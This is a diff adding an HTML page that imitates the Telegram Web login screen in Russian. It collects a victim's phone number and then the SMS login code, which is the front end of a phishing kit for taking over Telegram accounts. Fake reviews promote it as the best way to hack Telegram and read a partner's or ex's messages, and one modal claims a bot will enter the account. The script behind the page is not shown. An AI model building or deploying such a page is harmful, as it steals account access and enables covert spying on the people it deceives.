@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <i class="fab fa-telegram-plane telegram-icon"></i>
+            <h1>Telegram</h1>
+        </div>
+        <p class="subtitle">Введите номер телефона для входа в аккаунт</p>
+
+        <div class="input-group">
+            <input type="tel" id="phone" placeholder="+7 777 123 45 67" value="+7">
+            <div id="country-display" class="country-badge"></div>
+        </div>
+
+        <button id="next-btn" class="next-btn">Далее</button>
+
+        <div class="reviews">
+            <div class="review-card">
+                <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                <p>Спасибо, прочитал что пишет обо мне бывший!</p>
+            </div>
+            <div class="review-card">
+                <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                <p>Спасибо большое, увидела с кем мой парень переписывается</p>
+            </div>
+            <div class="review-card">
+                <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                <p>Лучший способ взломать Telegram</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно для подтверждения SMS -->
+    <div id="sms-modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Разрешить отправку SMS?</h2>
+            <p>Для продолжения необходимо разрешить отправку SMS через Telegram.</p>
+            <button id="allow-sms" class="modal-btn allow">Разрешить</button>
+            <button id="deny-sms" class="modal-btn deny">Запретить</button>
+            <div id="deny-message" class="deny-message hidden">
+                <p>Я устанавливаем вам "telegramm alphh *a mode" если вы не хотите чтобы бот зашел в ваш аккаунт и установил вам это обновление через раздел настройки то откажитесь мы вас не принуждаем!</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно для ввода кода -->
+    <div id="code-modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Введите код из SMS</h2>
+            <p>Мы отправили 5-значный код на ваш номер.</p>
+            <input type="text" id="code-input" placeholder="12345" maxlength="5">
+            <button id="submit-code" class="modal-btn allow">Подтвердить</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
